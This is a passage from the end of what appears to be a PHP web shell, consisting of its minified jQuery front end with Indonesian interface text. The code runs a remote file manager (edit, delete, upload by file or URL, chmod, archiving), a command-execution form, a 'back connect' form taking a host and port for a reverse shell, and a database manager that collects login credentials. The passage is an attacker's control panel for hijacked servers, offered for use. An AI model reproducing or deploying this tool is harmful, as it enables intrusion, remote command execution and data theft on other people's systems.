value="'+m.value+'"/>										<input type="hidden" name="xpath" value="'+u.value+'"/>										<input type="hidden" name="xname" value="'+c.value+'"/>										<div class="form-group mb-0">											<label for="xtarget" class="form-label">Move to:</label>											<div class="input-group mb-3">												<input type="text" class="form-control border-success" id="xtarget" name="xtarget" value="'+u.value+'" autofocus=""/>												<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>											</div>										</div>									</form>',r=""}if("download"==o)window.open("?act=path&dir="+u.value+"&entry="+c.value+"&opt="+o,"_blank");else if(["del","zip","unzip","tar","untar","tgz","untgz"].includes(o))i.modal("show"),i.find(".modal-title").html(o+" /"+c.value),i.find(".modal-body").html('<form method="post" action="?act='+o+'" id="rq'+o+'" class="text-center"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xname" value="'+c.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><div class="alert alert-info mt-n3 mx-n3 rounded-0">Klik proses utk melanjutkan!!</div><button class="btn btn-success" type="submit">Proses!</button></form>'),i.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),i.on("hidden.bs.modal",function(t){i.find(".modal-title").html("unknown"),i.find(".modal-body").html("null"),p.value=""});else if("edit"==o){i.modal("show"),i.find(".modal-dialog").addClass("modal-xl"),i.find(".modal-body").addClass("p-0"),i.find(".modal-title").html("Edit "+m.value.toUpperCase()+": /"+c.value);var f=i.find(".modal-content").html();d("edit",u.value,c.value,function(t){i.find(".modal-body").html('<textarea name="xdata">'+t+'</textarea><div id="xdata" class="position-relative rounded">'+t+"</div>"),i.find(".modal-content").html('<form method="post" action="?act=path&dir='+u.value+"&entry="+c.value+'&opt=edit" id="rqeditfile">'+i.find(".modal-content").html()+"</form>"),i.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button class="btn btn-success text-center" type="submit">Simpan</button></form>'),setTimeout(()=>{var t=i.find('textarea[name="xdata"]'),e=ace.edit("xdata",{theme:"ace/theme/monokai",maxLines:25,wrap:!1,autoScrollEditorIntoView:!0});t.hide(),e.setOptions({fontSize:"1em",mergeUndoDeltas:"always",copyWithEmptySelection:!0}),e.container.style.lineHeight="1.25em",e.session.setMode("ace/mode/php"),e.session.on("change",function(a){t.val(e.getValue())})},100)}),i.on("hidden.bs.modal",function(t){i.find(".modal-dialog").removeClass("modal-xl"),i.find(".modal-content").html(f),i.find(".modal-title").html("unknown"),i.find(".modal-body").removeClass("p-0").html("null"),i.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),p.value=""})}else"view"==o?(i.modal("show"),i.find(".modal-dialog").addClass("modal-xl"),i.find(".modal-title").html("View "+m.value.toUpperCase()+": /"+c.value),d("view",u.value,c.value,function(t){i.find(".modal-body").attr("style","background:#2b2f34;").addClass("rounded-0 p-0").html('<div id="vdata">'+t+"</div>"),i.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button type="button" class="btn btn-danger text-center" data-dismiss="modal" aria-label="Close">Tutup</button>');var e=ace.edit("vdata",{theme:"ace/theme/monokai",maxLines:25,wrap:!1,autoScrollEditorIntoView:!0});e.setOptions({fontSize:"1em",mergeUndoDeltas:"always",copyWithEmptySelection:!0}),e.container.style.lineHeight="1.25em",e.session.setMode("ace/mode/php"),e.session.setUseWorker(!1),e.setShowPrintMargin(!1),e.setReadOnly(!0)}),i.on("hidden.bs.modal",function(t){i.find(".modal-dialog").removeClass("modal-xl"),i.find(".modal-title").html("unknown"),i.find(".modal-body").attr("style","").removeClass("rounded-0 p-0").html("null"),i.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),p.value=""})):(i.modal("show"),i.find(".modal-title").html(l),i.find(".modal-body").html(s),i.on("hidden.bs.modal",function(t){i.find(".modal-title").html("unknown"),i.find(".modal-body").html("null"),p.value=""}))}else n("Error","Invalid request!")},!1)}function l(o,i){t.ajax({type:"get",url:"?act=path&dir="+o,timeout:5e3,beforeSend:function(){t("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()}}).done(function(e,n,d){t("#fileman").html(a.decode(e)),t("form#rqupload,form#rquploader,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),i(e)}).fail(function(e,a,i){t("#fileman").html(a+", response code: "+e.status),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide(),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),n("Error",a+", response code: "+e.status)})}t(document).on("change","input#diCheckAll",function(e){t(document).find('input[id^="diCheck"]').prop("checked",t(this).prop("checked"))}),t(document).on("change",'input[id^="diCheck"]',function(e){t(e.target).attr("checked")?t(this).removeAttr("checked"):t(this).attr("checked","checked")}),t(document).on("change","select#fdirexec",function(e){var n=t(e.target).val(),o=t(e.target).data("xpath"),i=[],d=t(document).find('input[id^="diCheck"]:checked');t.each(d,function(e,a){i.push({type:t(a).data("xtype"),name:t(a).data("xname")})}),document.querySelectorAll("#fdirexec"),function e(n,o,i){var d=t("#modalshowaksi"),s="",l="",r=[],m=[];i.forEach((t,e)=>{"dir"==t.type&&r.push(t.name+"/"),"file"==t.type&&m.push(t.name)});var c="",u="";switch(m.length>0&&(c='<div class="input-group mb-2 mb-sm-3"><div class="input-group-prepend"><label class="input-group-text">File</label></div><textarea class="form-control form-control-sm border-success" rows="1" readonly disabled>'+m.join(", ")+"</textarea></div>"),r.length>0&&(u='<div class="input-group mb-2 mb-sm-3"><div class="input-group-prepend"><label class="input-group-text">Dirs</label></div><textarea class="form-control form-control-sm border-success" rows="1" readonly disabled>'+r.join(", ")+"</textarea></div>"),n){case"mass_copy":l="Copy",r.length+m.length>0?(s='<form method="post" action="?act='+n+'" id="rq'+n+'">								<input type="hidden" name="xpath" value="'+o+'"/>								<input type="hidden" name="xdata" value="'+a.encode(JSON.stringify(i))+'"/>								'+(c+u)+'								<div class="form-group mb-0">									<label for="xtarget" class="form-label">Paste to:</label>									<div class="input-group mb-3">										<input type="text" class="form-control border-success" id="xtarget" name="xtarget" value="'+o+'" autofocus=""/>										<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>									</div>								</div>							</form>',d.find(".modal-body").addClass("pb-0")):s="Pilih dulu file atau direktori yang mw dicopy!";break;case"mass_cut":l="Cut",r.length+m.length>0?(s='<form method="post" action="?act='+n+'" id="rq'+n+'">								<input type="hidden" name="xpath" value="'+o+'"/>								<input type="hidden" name="xdata" value="'+a.encode(JSON.stringify(i))+'"/>								'+(c+u)+'								<div class="form-group mb-0">									<label for="xtarget" class="form-label">Move to:</label>									<div class="input-group mb-3">										<input type="text" class="form-control border-success" id="xtarget" name="xtarget" value="'+o+'" autofocus=""/>										<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>									</div>								</div>							</form>',d.find(".modal-body").addClass("pb-0")):s="Pilih dulu file atau direktori yang mw dipindah!";break;case"mass_del":l="Delete",r.length+m.length>0?(s='<form method="post" action="?act='+n+'" id="rq'+n+'">								<input type="hidden" name="xpath" value="'+o+'"/>								<input type="hidden" name="xdata" value="'+a.encode(JSON.stringify(i))+'"/>								'+(c+u)+'								<p class="text-center">Data di atas yakin ingin dihapus?</p>								<div class="text-center">									<button class="btn btn-danger" type="submit">Hajar!</button>								</div>							</form>',d.find(".modal-body").removeClass("pb-0")):s="Pilih dulu file atau direktori yang mw dihapus!";break;case"mass_zip":l="Zip Archives",r.length+m.length>0?(s='<form method="post" action="?act='+n+'" id="rq'+n+'">								<input type="hidden" name="xpath" value="'+o+'"/>								<input type="hidden" name="xdata" value="'+a.encode(JSON.stringify(i))+'"/>								'+(c+u)+'								<div class="form-group row mb-0">									<label for="xname" class="col-sm-2 col-form-label">Rename</label>									<div class="col-sm-10">										<div class="input-group mb-3">											<input type="text" class="form-control border-success" id="xname" name="xname" value="" placeholder="newfile" autofocus=""/>											<div class="input-group-prepend"><span class="input-group-text">.zip</span></div>											<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>										</div>									</div>								</div>							</form>',d.find(".modal-body").addClass("pb-0")):s="Pilih dulu file atau direktori yang mw dikompres!";break;case"mass_tar":l="Compress to TAR",r.length+m.length>0?(s='<form method="post" action="?act='+n+'" id="rq'+n+'">								<input type="hidden" name="xpath" value="'+o+'"/>								<input type="hidden" name="xdata" value="'+a.encode(JSON.stringify(i))+'"/>								'+(c+u)+'								<div class="form-group row mb-0">									<label for="xname" class="col-sm-2 col-form-label">Rename</label>									<div class="col-sm-10">										<div class="input-group mb-3">											<input type="text" class="form-control border-success" id="xname" name="xname" value="" placeholder="newfile" autofocus=""/>											<div class="input-group-prepend"><span class="input-group-text">.tar</span></div>											<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>										</div>									</div>								</div>							</form>',d.find(".modal-body").addClass("pb-0")):s="Pilih dulu file atau direktori yang mw dikompres!";break;case"mass_tgz":l="Compress to TAR.GZ",r.length+m.length>0?(s='<form method="post" action="?act='+n+'" id="rq'+n+'">								<input type="hidden" name="xpath" value="'+o+'"/>								<input type="hidden" name="xdata" value="'+a.encode(JSON.stringify(i))+'"/>								'+(c+u)+'								<div class="form-group row mb-0">									<label for="xname" class="col-sm-2 col-form-label">Rename</label>									<div class="col-sm-10">										<div class="input-group mb-3">											<input type="text" class="form-control border-success" id="xname" name="xname" value="" placeholder="newfile" autofocus=""/>											<div class="input-group-prepend"><span class="input-group-text">.tar.gz</span></div>											<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>										</div>									</div>								</div>							</form>',d.find(".modal-body").addClass("pb-0")):s="Pilih dulu file atau direktori yang mw dikompres!"}d.modal("show"),d.find(".modal-title").html(l),d.find(".modal-body").html(s),d.find(".modal-footer").removeClass("d-flex justify-content-center").addClass("d-none"),d.on("hidden.bs.modal",function(t){d.find(".modal-title").html("unknown"),d.find(".modal-body").removeClass("pb-0").html("null"),d.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center")})}(n,o,i)}),t(document).on("click","a#chdrive",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-path");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rquploader,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o)}}).done(function(){s(document.querySelectorAll("#showaksi")),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("form#rqcmd").parent().find("#hasilcommand").html("")})}),t(document).on("click","a#chdir",function(e){e.preventDefault();var a=t(e.currentTarget).attr("data-path");t("ol.breadcrumb").addClass("pl-0").css({background:"transparent",padding:"0"}).html('<li class="breadcrumb-item w-100 active">					<form method="post" action="?act=changedir" class="mb-0" id="rqchdir">						<div class="input-group">							<input type="text" name="xpath" class="form-control form-control-sm border-success" value="'+a+'" autofocus></input>							<div class="input-group-append">								<button class="btn btn-success" type="submit">Go</button>							</div>						</div>					</form></li>')}),t("button#fmanager").on("click",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-tempdir");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rquploader,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o)}}).done(function(){s(document.querySelectorAll("#showaksi")),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("form#rqcmd").parents().find("#hasilcommand").html("")})}),t("button#fmanager").trigger("click"),t('button[data-target="#nav-cmd"]').on("shown.bs.tab",function(e){t("#hasilcommand").hide()}),t('button[data-target="#nav-berkas"]').on("shown.bs.tab",function(e){t("#fberkas").show()}),t('button[data-target="#nav-berkas"]').on("hidden.bs.tab",function(e){t("#fberkas").hide()}),t('button[data-target="#nav-info"]').on("hidden.bs.tab",function(e){t("#nav-info").find("#showinfo").html("")}),t('button[data-target="#nav-info"]').on("shown.bs.tab",function(a){var n=t("#nav-info").find("#showinfo");t.ajax({type:"get",url:"?act=info",dataType:"json",beforeSend:function(){t(n).html(e)}}).done(function(e){try{var a=JSON.parse(JSON.stringify(e)),o=t.map(a,function(t,e){return[t]});t(n).html('<blockquote class="blockquote px-3 pt-n3 pb-3 bg-success-rgb rounded">'+o.join("")+"</blockquote>")}catch(i){t(n).html("Error: Gagal menganalisa server!")}})}),t('button[data-target="#nav-sql"]').on("shown.bs.tab",function(a){var n=t("#nav-sql").find("#showsqlframe");t.ajax({type:"get",url:"?act=sql&q=check",dataType:"json",beforeSend:function(){t(n).html(e)},success:function(e){t(n).find(".bg-transparent").remove()}}).done(function(e){try{var a=JSON.parse(JSON.stringify(e));if(!1==a.error){var o="";["MySQL","MSSql","PDO","odbc","Oracle","PostgreSQL","SQLite","SQLite3"].forEach((t,e)=>{var n=a.data.includes(t)?"":"disabled";o+='<option value="'+t+'" '+n+">"+t+"</option>"}),n.html('<h6 class="text-info">MySQL Manager</h6>							<form method="post" action="?act=sql&q=connect" class="mb-0" id="rqsql">								<div class="row mb-2">									<div class="col-6 col-sm-6 col-md-3">										<div class="form-group">											<label for="sqltype" class="mb-1">Koneksi</label>											<div class="input-group input-group-sm">												<select name="sqltype" id="sqltype" class="custom-select custom-select-sm border-success">'+o+'</select>												<div class="input-group-append"><button class="btn btn-outline-success" type="submit">Go</button></div>											</div>										</div>									</div>									<div class="col-6 col-sm-6 col-md-3">										<div class="form-group">											<label for="sqlhost" class="mb-1">Host</label>											<input type="text" name="sqlhost" id="sqlhost" class="form-control form-control-sm border-success" placeholder="locahost" value="localhost"/>										</div>									</div>									<div class="col-6 col-sm-6 col-md-3">										<div class="form-group">											<label for="sqluser" class="mb-1">Username</label>											<input type="text" name="sqluser" id="sqluser" class="form-control form-control-sm border-success" placeholder="root"/>										</div>									</div>									<div class="col-6 col-sm-6 col-md-3">										<div class="form-group">											<label for="sqlpass" class="mb-1">Password</label>											<input type="text" name="sqlpass" id="sqlpass" class="form-control form-control-sm border-success" placeholder="password"/>										</div>									</div>								</div>							</form>							<div id="tbdatabase"></div>')}}catch(i){t(n).html("<blockquote class='blockquote text-center px-3 py-2 mt-2 bg-success-rgb rounded'><span class='text-cyan'>Error: "+i.message+"</span></blockquote>")}})}),t("#fileman").length>0&&(t("#fileman").on("click","a#ffmanager, button#ffmanager",function(e){e.stopPropagation(),l(t(this).attr("data-path"),function(){s(document.querySelectorAll("#showaksi"))})}),t("#fileman").on("click","a#fxmanager",function(e){e.stopPropagation(),l(t(this).attr("data-path"),function(){s(document.querySelectorAll("#showaksi"))})})),t("#showchmod").on("show.bs.modal",function(e){var a=t(e.relatedTarget),n=t(this).find(".modal-body"),o=a.attr("data-xtype"),i=a.attr("data-xname"),d=a.attr("data-xpath"),s=a.attr("data-xperm");n.find('input[name="xtype"]').val(o),n.find('input[name="xname"]').val(i),n.find('input[name="xpath"]').val(d),n.find('input[name="xperm"]').val(s).focus(),n.find('input[id="xname"]').val(i),n.find('label[for="xname"]').css("text-transform","capitalize").html("dir"==o?"Directory":"File")}),t.each(["rqdel","rqzip","rqunzip","rqtar","rquntar","rqtgz","rquntgz","rqmass_zip","rqmass_tar","rqmass_tgz","rqmass_del","rqmass_copy","rqmass_cut","rqcopy","rqcut","rqrename","rqtouch","rqchmod","rqreadfile","rqeditfile","rqnewfile","rqbc"],function(o,i){t(document).on("submit","form#"+i,function(o){o.preventDefault();var d=t(this),s=t("#modalshowaksi");if(d.find('button[type="submit"]').prop("disabled",!0),"rqrename"==i||"rqtouch"==i)d.find('input[readonly="readonly"]').prop("readonly",!1);else if("rqeditfile"==i||"rqnewfile"==i)var l=a.encode(d.find('textarea[name="xdata"]').val());else if("rqbc"==i){var r=d.find('input[name="bhost"]').val(),m=d.find('input[name="bport"]').val();if(d.find('input[name="btype"]').val(),t("body").find("#showbc").remove(),r.length<=0||m.length<=0)return n("Opss!","Server dan port gak boleh dikosongin!"),d.find('button[type="submit"]').prop("disabled",!1),!1}else if("rqcut"==i);else if("rqreadfile"==i){var c=d.find('input[name="xpath"]').val();if(c.length<1)return n("Opss!","Isi dulu nama filenya pak!"),!1;s.modal("show"),s.find(".modal-title").html("View FILE: "+c),d.find('button[type="submit"]').prop("disabled",!1)}t.ajax({type:"post",url:d.attr("action"),data:"rqeditfile"==i||"rqnewfile"==i?{xdata:l}:d.serialize(),beforeSend:function(){t("rqbc"==i?'<div class="row" id="showbc"><div class="col-12 mb-3">'+e+"</div></div>":e).insertAfter(d)}}).fail(function(t,e){d.parent().find("div.bg-transparent").remove(),d.find('button[type="submit"]').prop("disabled",!1),n("Alert","Request failed: "+e)}).done(function(e){if(d.parent().find("div.bg-transparent").remove(),d.find('button[type="submit"]').prop("disabled",!1),"rqreadfile"==i){s.find(".modal-dialog").addClass("modal-xl"),s.find(".modal-body").addClass("p-0").html('<div id="vdata">'+e+"</div>"),s.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button type="button" class="btn btn-danger text-center" data-dismiss="modal" aria-label="Close">Tutup</button>');var a=ace.edit("vdata",{theme:"ace/theme/monokai",maxLines:25,wrap:!1,autoScrollEditorIntoView:!0});a.setOptions({fontSize:"1em",mergeUndoDeltas:"always",copyWithEmptySelection:!0}),a.container.style.lineHeight="1.25em",a.session.setMode("ace/mode/php"),a.session.setUseWorker(!1),a.setShowPrintMargin(!1),a.setReadOnly(!0),s.on("hidden.bs.modal",function(t){s.find(".modal-dialog").removeClass("modal-xl"),s.find(".modal-body").removeClass("rounded-0 p-0").html("null"),s.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center")})}else"rqbc"==i?t("#showbc div").html('<pre class="pre-scrollable mb-0">'+e+"</pre>"):("rqrename"==i||"rqtouch"==i?d.find('input[readonly="readonly"]').prop("readonly",!0):"rqchmod"==i&&t("body").find("#showchmod").modal("hide"),s.modal("hide"),n("Alert",e));var o=t("#fileman").find("a#ffmanager");o[o.length-1].click(function(t){t.stopPropagation()})})})}),t(document).on("submit","form#rqchdir",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xpath"]').val();o.length<1?n("Opss!","Isi dulu nama direktorinya pak!"):(a.find('button[type="submit"]').prop("disabled",!0),l(o,function(){var t=document.querySelectorAll("#showaksi");t.length>0?s(t):n("Error","Direktori tidak ada/ tidak berisi file apapun!")}),a.find('button[type="submit"]').prop("disabled",!1))}),t(document).on("submit","form#rqmkdir",function(a){a.preventDefault();var o=t(this),i=o.find('input[name="xdir"]').val();if(i.length<1)n("Error","Isi dulu nama direktorinya pak!");else if("file"==o.find(":selected").val()){var d=t("#modalshowaksi"),s=o.find('input[name="xpath"]').val(),l=d.find(".modal-content").html();d.modal("show"),d.find(".modal-title").text("FileName: "+i),d.find(".modal-dialog").addClass("modal-xl"),d.find(".modal-body").addClass("rounded-0 p-0").html('<textarea name="xdata"></textarea><div id="xdata" class="position-relative rounded"></div>'),d.find(".modal-content").html('<form method="post" action="?act=path&dir='+s+"&entry="+i+'&opt=newfile" id="rqnewfile">'+d.find(".modal-content").html()+"</form>"),d.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button class="btn btn-success text-center" type="submit">Simpan</button></form>');var r=d.find('textarea[name="xdata"]'),m=ace.edit("xdata",{theme:"ace/theme/monokai",minLines:10,maxLines:25,wrap:!1,autoScrollEditorIntoView:!0});r.hide(),m.setOptions({fontSize:"1em",mergeUndoDeltas:"always",copyWithEmptySelection:!0}),m.container.style.lineHeight="1.25em",m.session.setMode("ace/mode/php"),m.session.on("change",function(t){r.val(m.getValue())}),d.on("hidden.bs.modal",function(t){d.find(".modal-dialog").removeClass("modal-xl"),d.find(".modal-content").html(l),d.find(".modal-title").html("unknown"),d.find(".modal-body").removeClass("rounded-0 p-0").html("null"),d.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center")})}else o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),beforeSend:function(){t(e).insertAfter(o)},success:function(e){o.next("span").remove(),o.find('button[type="submit"]').prop("disabled",!1),n("Alert",e);var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()}),o.next("span#notify").fadeTo(3e3,500).slideUp(500,function(){t(this).slideUp(500)})}})}),t(document).on("click","div#uploadmethod",function(e){e.preventDefault(),t(this).find("select#xtype").on("change",function(){var e=t(this).find(":selected").val();t("file"==e?"#uploadtypefile":"#uploadtypeurl").modal("show")})}),t(document).on("submit","form#rquploader",function(a){a.preventDefault();var o=t(this);o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),beforeSend:function(){t(e).insertAfter(o)}}).done(function(e){o[0].reset(),o.parent().find("div.bg-transparent").remove(),o.find('button[type="submit"]').prop("disabled",!1),t("#uploadtypeurl").modal("hide"),n("Alert",e);var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()})})}),t("form#rqupload").find('input[type="file"]').on("change",function(){t("form#rqupload").submit()}),t(document).on("submit","form#rqupload",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xfile[]"]').prop("files");if(o&&o.length<=0||o.size<1)n("Error","File kosong, gak ada isinya!");else{var i=new FormData(this);a.find('button[type="submit"]').prop("disabled",!0),i.append("xfile",o),t.ajax({type:"post",url:a.attr("action"),data:i,dataType:"text",contentType:!1,processData:!1,beforeSend:function(){a.next("span").remove()},success:function(e){a[0].reset(),a.next("span").remove(),a.find('button[type="submit"]').prop("disabled",!1),n("Alert",e),t("#uploadtypefile").modal("hide");var o=t("#fileman").find("a#ffmanager");o[o.length-1].click(function(t){t.stopPropagation()})}})}}),t(document).on("submit","form#rqcmd",function(n){n.preventDefault();var o=t(this);o.parents().find("#hasilcommand").show(),o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),dataType:"json",beforeSend:function(){o.find("input").prop("disabled",!0),o.parents().find("#hasilcommand").html(e)},success:function(t){var e=JSON.parse(JSON.stringify(t));o.find('input[name="xpath"]').val(a.decode(e.path)),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a.decode(e.stdout)+"</div></div>")},error:function(t,e,a){o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+e+": "+a+"</div></div>")}}).done(function(e){o.find('button[type="submit"], input').prop("disabled",!1);var n=JSON.parse(JSON.stringify(e));t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile,form#rqbc").find('input[name="xpath"]').val(a.decode(n.path)),t("div#uploadmethod").attr("data-xpath",a.decode(n.path)),t.each(t("button[data-tempdir]"),function(e,o){t(o).attr("data-tempdir",a.decode(n.path))}),t.each(t("a#fxmanager"),function(e,o){t(o).attr("data-path",a.decode(n.path))})})}),t(document).on("submit","form#rqsql",function(a){a.preventDefault();var n=t(this);n.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:n.attr("action"),data:n.serialize(),beforeSend:function(){n.find("select, input").prop("disabled",!0),n.parent().find("#tbdatabase").html(e)},success:function(t){n.parent().find("#tbdatabase").html(t)},error:function(e,a,o){t('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a+": "+o+"</div></div>").insertAfter(n)}}).done(function(a){n.find('button[type="submit"], select, input').prop("disabled",!1),t(document).find("#sqlmanager select#dblists").on("change",function(){var a=t(this).find("option:selected").data("connect");t(document).find('#sqlmanager .sqltabpanel form input[name="sqlconnect"]').val(a),setTimeout(()=>{t.ajax({type:"post",url:n.attr("action").replace("connect","manage"),data:{sqlconnect:a},beforeSend:function(){t("#sqlmanager").find("#dbshowtable tbody").html('<tr><td class="text-center">'+e+"</td></tr>")},success:function(e){t("#sqlmanager").find("#dbshowtable tbody").html("")},error:function(e,a,n){t("#sqlmanager").find("#dbshowtable tbody").html('<tr><td class="text-center">'+a+": "+n+"</td></tr>")}}).done(function(e){if(e.length>3&&o(e)){var a=JSON.parse(e),n="",i='<div class="tab-content">';t.each(a,function(t,e){n+='<tr class="nav-items"><td class="nav-link p-0 pl-2" type="button" data-toggle="tab" data-target="#'+t+'" role="tab" aria-controls="'+t+'" aria-selected="false">'+t+"</td></tr>",i+='<div class="tab-pane fade" id="'+t+'"></div>'}),i+="</div>",t("#sqlmanager .sqltabpanel form").find("#flimit").addClass("d-none"),t("#sqlmanager").find("#dbshowrows").html(i),t("#sqlmanager").find("#dbshowtable tbody").addClass("nav nav-tabs flex-column").html(n)}else t("#sqlmanager").find("#dbshowtable tbody").html('<tr><td class="text-center">'+("[]"==e?"Tidak ada data!":e)+"</td></tr>")})},150)}),t(document).find("#sqlmanager select#dblists option:first-child").attr("selected","selected").trigger("change")})}),t(document).on("submit","#sqlmanager .sqltabpanel form",function(a){a.preventDefault();var n=t(this),d=n.find('input[name="sqlgetdata"]').val(),s="";if(n.find('textarea[name="sqlquery"]').val().length>0&&(n.find("#flimit").addClass("d-none"),n.find('input[name="sqlgetdata"]').val(""),d=""),d.length>0)s=d;else{var l=t(document).find("#dbshowtable tbody tr td.nav-link").filter(function(){return t(this).hasClass("active")});n.parent().parent().find("#dbshowrows "+t(l).data("target")).removeClass("active show"),s=n.parent().parent().find("#dbshowrows .tab-pane:first-child").attr("id"),n.parent().parent().find("#dbshowrows #"+s).addClass("show active")}n.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:n.attr("action"),data:n.serialize(),beforeSend:function(){t(document).find("#sqlmanager select#dblists").prop("disabled",!0),n.find("textarea, input, select").prop("disabled",!0),t("#sqlmanager").find("#dbshowrows #"+s).html(e)},success:function(e){t("#sqlmanager").find("#dbshowrows #"+s).html("")},error:function(e,a,n){t("#sqlmanager").find("#dbshowrows #"+s).html(a+": "+n)}}).done(function(e){if(n.find('button[type="submit"], textarea, input, select').prop("disabled",!1),t(document).find("#sqlmanager select#dblists").prop("disabled",!1),e.length>3&&o(e)){var a=JSON.parse(e),d="",l=[];Object.keys(a).forEach(t=>{var e=a[t];Array.isArray(e)&&e.length>0?(d=Object.keys(e[0]),l.push(e)):"object"==typeof e&&null!==e?(d=Object.keys(e),l.push(e)):(d=["nodata"],l.push("Belum ada data"))});var r=i(l,d);t("#sqlmanager").find("#dbshowrows #"+s).html('<div class="table-responsive text-nowrap">'+r.prop("outerHTML")+"</div>")}else t("#sqlmanager").find("#dbshowrows #"+s).html("[]"==e?"Tidak ada data!":e)})}),t(document).on("hidden.bs.tab","#sqlmanager #dbshowtable tbody tr td.nav-link",function(e){var a=t(document).find("#sqlmanager .sqltabpanel form");a.find('#flimit input[name="slimit"]').val(0),a.find('#flimit input[name="elimit"]').val(25)}),t(document).on("show.bs.tab","#sqlmanager #dbshowtable tbody tr td.nav-link",function(a){a.relatedTarget&&t(a.relatedTarget).removeClass("active");var n=t(a.target).attr("aria-controls");(dform=t(document).find("#sqlmanager .sqltabpanel form")).find("#flimit").removeClass("d-none"),dform.find('input[name="sqlgetdata"]').val(n),dform.find('textarea[name="sqlquery"]').html(""),t.ajax({type:"post",url:dform.attr("action"),data:dform.serialize(),beforeSend:function(){dform.find("textarea, input, select").prop("disabled",!0),t(document).find("#sqlmanager select#dblists").prop("disabled",!0),t("#sqlmanager").find("#dbshowrows #"+n).html(e)},success:function(e){t("#sqlmanager").find("#dbshowrows #"+n).html("")},error:function(e,a,o){t("#sqlmanager").find("#dbshowrows #"+n).html(a+": "+o)}}).done(function(e){if(dform.find('button[type="submit"], textarea, input, select').prop("disabled",!1),t(document).find("#sqlmanager select#dblists").prop("disabled",!1),e.length>3&&o(e)){var a=JSON.parse(e),d="",s=[];Object.keys(a).forEach(t=>{var e=a[t];Array.isArray(e)&&e.length>0?(d=Object.keys(e[0]),s.push(e)):"object"==typeof e&&null!==e?(d=Object.keys(e),s.push(e)):(d=["nodata"],s.push("Belum ada data"))});var l=i(s,d);t("#sqlmanager").find("#dbshowrows #"+n).html('<div class="table-responsive text-nowrap">'+l.prop("outerHTML")+"</div>")}else t("#sqlmanager").find("#dbshowrows #"+n).html("[]"==e?"Tidak ada data!":e)})}),t(document).on("hidden.bs.modal",function(){t(".container").attr("style","filter: blur(0px);")}),t(document).on("show.bs.modal",function(){t(".container").attr("style","filter: blur(2px);")})}(jQuery);</script>
 	</body>
 </html>
 <?php }?>
